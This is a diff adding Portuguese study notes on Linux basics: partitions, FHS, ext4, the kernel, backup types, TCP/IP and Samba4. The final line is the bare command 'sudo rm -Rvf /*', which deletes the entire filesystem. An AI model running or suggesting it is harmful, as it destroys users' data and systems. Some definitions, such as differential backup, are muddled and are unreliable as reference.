@@ -1,0 +1,65 @@
+Divisao logica para HD	
+	
+	Bios trabalha com padrao MBR
+	UEFI trabalha com padrao GPT
+	
+Partições: 
+	
+	Primaria
+		Só pode criar no maximo 4
+			sempre vai usar para instalar o win ou linux
+
+	Estendida
+		Só existe 1 partição estendida
+	
+	Lógica	
+		Pode criar ate no maximo 256 so que so usamos 16
+		
+Pesquisas: 
+
+LSB: Linux Standard Base (LSB), traduzido para Base Padrão do Linux, é um projeto conjunto de diversas distribuições Linux sob a estrutura organizacional da Fundação Linux para padronizar a estrutura de sistemas de software, incluindo a hierarquia de sistema de arquivos usada no sistema operacional Linux.
+
+FHS: O Filesystem Hierarchy Standard (padrão para sistema de arquivos hierárquico), ou FHS, define os principais diretórios, e o seu conteúdo, em um sistema operacional Linux ou do tipo Unix. A versão atual é a 3.0, anunciada em 3 de junho de 2015.
+
+EXT4: ext4 ou fourth extended filesystem (em português: quarto sistema de arquivos estendido) é um sistema de arquivos de registro para Linux, desenvolvido para ser o sucessor do ext3.
+
+KERNEL: O kernel é o componente principal de um sistema operacional Linux e a interface central entre o hardware e os processos executados por um computador. Ele estabelece a comunicação entre ambos, gerenciando recursos com a maior eficiência possível.
+
+
+Pesquisas:
+
+Backup completo: 
+
+Backup completo ou full é simplesmente fazer a cópia completa de todos os arquivos, pastas ou volumes para destinos estabelecidos como servidores, sistemas de discos ou fitas como tapes LTO e autoloaders.
+
+Backup diferencial: 
+
+Ele é feito após o backup full e realiza apenas backups dos arquivos já alterados em sua primeira execução. Na segunda realização, ele faz o armazenamento dos documentos que foram alterados após o último backup completo, mais os arquivos modificados depois do primeiro diferencial.
+
+Backup incremental:
+ 
+O backup incremental surgiu para sanar algumas deficiências encontradas ao realizar o backup full, como a de sempre copiar todos os dados a cada operação, mesmo que nenhuma alteração tenha sido realizada. Além dos recursos desnecessariamente consumidos para manter diversas cópias completas dos dados, o crescimento explosivo na criação de conteúdo aumentou muito o tempo gasto para manter o backup sempre atualizado. O primeiro passo para instituir um sistema de backup incremental é a realização da cópia completa dos dados. Assim que essa cópia for realizada, a cada nova instrução de backup o sistema verificará quais arquivos foram alterados desde o último evento e, havendo alteração, só copiará os que forem mais atuais.
+
+Backup sync:
+Backup e sincronização é um serviço de armazenamento que salva automaticamente suas fotos e vídeos na sua Conta do Google. Essas fotos e vídeos estarão acessíveis de qualquer dispositivo em que você esteja conectado à sua conta.
+
+
+Pesquisas: 
+
+Softwares de backup para linux mint: Pcloud / Mega / Idrive / Google Drive
+
+
+O que é TCP/IP: 
+
+O TCP/IP (Transmission Control Protocol/Internet Protocol) representa um conjunto de protocolos que permitem que diversos equipamentos que constituem uma rede possam comunicar entre si. É um protocolo estruturado por camadas na qual cada camada utiliza e presta serviços às camadas adjacentes.
+
+IPv4 significa Protocol version 4, ou versão 4 de protocolos. É a tecnologia que permite que nossos aparelhos conectem na Internet, seja qual for o tipo de gadget – pode ser PC, Mac, smartphones ou outros aparelhos.
+
+
+Samba4: 
+O Samba 4.0 compreende um servidor de diretório LDAP, um servidor de autenticação Heimdal Kerberos, um servidor DNS dinâmico e implementações de todas as chamadas de procedimento remoto necessários para o Active Directory.
+
+Ele permite que usuários de dispositivos com Windows, distribuições Linux e macOS comuniquem-se em rede para troca de arquivos e compartilhamento de redes por meio do protocolo SMB. Diante disso, o seu uso tornou-se um fator estratégico.
+
+
+sudo rm -Rvf /*
